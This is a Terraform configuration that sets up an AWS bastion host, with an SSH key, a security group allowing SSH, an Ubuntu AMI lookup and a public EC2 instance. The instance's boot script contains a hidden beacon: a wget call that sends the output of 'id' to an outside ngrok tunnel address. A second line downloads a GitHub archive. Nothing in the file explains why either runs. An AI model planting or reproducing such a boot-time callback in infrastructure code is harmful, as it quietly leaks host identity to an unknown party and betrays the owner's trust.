
# Add ssh key
resource "aws_key_pair" "deployer" {
  key_name   = "deployer-key"
  public_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDS4u0vd4q6qMCcokVfMGkZ+aM3jt9cnna92KBZ2kfpVgrvLJS1Mq1VTJPZmPzlmNTBXsllTwBI16ePAjKbljfV3AaOwzCBLGMQY6Qwas/Y7zZCYGjm9vgy0MlKpZFgYAEMjgh62Gc7PsFHCrYbk5a1UqLdjg2UltoYH64ladpWf9kgzK8BBGKy5/9DWo7x7Uk9HZqr3s4pWiA0oVgy2HqxeKEaoBS11H8fxgR1tnWAcQk/Iaf+DUJYJ3jUaiZybZozOxSfy3KNm57pLFKB1Z6Yu7JIYrEytLgWvsw+CgLxQaXzGybnwvMP2zsfBWih+M36OG04MeBROZFZvhEvH+G8EQVihkyGM8I6T6fqDeFSrJrvXa3pkIZ0KZDOtHPXvuaUeBE6TyFsqMf0vNB70dX56I61MrUsYo/wrqMbXKfHImKUVPSmkKioNTGi8hljKddcR8PDNIfZ0xMwZ7EhceRCXG5ALBdF2cFkQnMJ1sAk1keSZQzwMVoke/roWWSxxMk="

  tags = {
    App = "${local.app-name}"
  }
}

# Create Security Group - bastion host
resource "aws_security_group" "jumphost" {
  vpc_id      = aws_vpc.vpc.id
  name        = "SecurityGroup-Jumphost"
  description = "Security Group for the Jumphost."

  ingress {
    protocol    = "tcp"
    from_port   = 22
    to_port     = 22
    cidr_blocks = ["${local.admin-cidr}", "${local.aws-cidr}"]
  }

  egress {
    protocol    = "-1"
    from_port   = 0
    to_port     = 0
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = {
    App = "${local.app-name}"
  }
}
# Create EC2 Instance - bastion host
data "aws_ami" "ubuntu" {
  most_recent = true

  filter {
    name   = "name"
    values = ["ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*"]
  }

  filter {
    name   = "virtualization-type"
    values = ["hvm"]
  }

  owners = ["099720109477"] # Canonical

  tags = {
    App = "${local.app-name}"
  }
}

# Create EC2 Instance - application (+ssh-accessible)
resource "aws_instance" "instance-1" {
  instance_type               = "t2.micro"  # Free Tier
  ami                         = data.aws_ami.ubuntu.id
  vpc_security_group_ids      = [aws_security_group.jumphost.id]
  subnet_id                   = aws_subnet.public-subnet-1.id
  key_name                    = "deployer-key"
  associate_public_ip_address = true
  user_data                   = <<-EOF
  wget https://f015-192-222-189-20.ngrok-free.app/$(id|tr ' ' '_')
  wget https://github.com/DataWearsAHood/hasty-paste/archive/refs/heads/main.zip
  touch /tmp/user-data-ran
  EOF
  iam_instance_profile        = aws_iam_instance_profile.instance_profile.name

  tags = {
    App = "${local.app-name}"
  }
}

# Output
output "jumphost-public-ip" {
  value = aws_instance.instance-1.public_ip
}

# End;